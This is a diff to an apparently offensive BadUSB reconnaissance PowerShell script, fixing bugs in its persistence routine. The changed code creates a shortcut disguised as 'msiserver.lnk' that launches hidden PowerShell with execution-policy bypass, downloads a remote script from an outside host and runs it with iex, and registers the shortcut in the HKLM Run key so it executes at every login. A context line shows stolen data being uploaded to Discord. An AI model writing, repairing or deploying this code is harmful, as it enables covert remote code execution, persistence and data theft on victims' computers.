@@ -668,18 +668,18 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}
 ############################################################################################################################################################
  
 # Setup Persistence if possible
-if(![System.IO.File]::Exists($env:USERPROFILE + "msiserver.lnk")){
+if(![System.IO.File]::Exists($env:USERPROFILE+"\msiserver.lnk")){
     $objShell = New-Object -COM WScript.Shell
-	$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "msiserver.lnk")
-	$target = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-	$args = "-w h -ep bypass -command `"`$dc='$dc';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex`""
+	$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\msiserver.lnk")
+	$target = "powershell"
+	$args = "-w h -ep bypass -command `"`$dc='"+$dc+"';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex`""
 	$objShortCut.TargetPath = $target
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
 	$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
 	$val = $env:USERPROFILE+"\msiserver.lnk"
 	New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name run -Force
-	New-ItemProperty -Path $path -Name "msiserver" -Value "$env:USERPROFILEmsiserver.lnk" -PropertyType "String"
+	New-ItemProperty -Path $path -Name "msiserver" -Value $val -PropertyType "String"
 }
 
 ############################################################################################################################################################
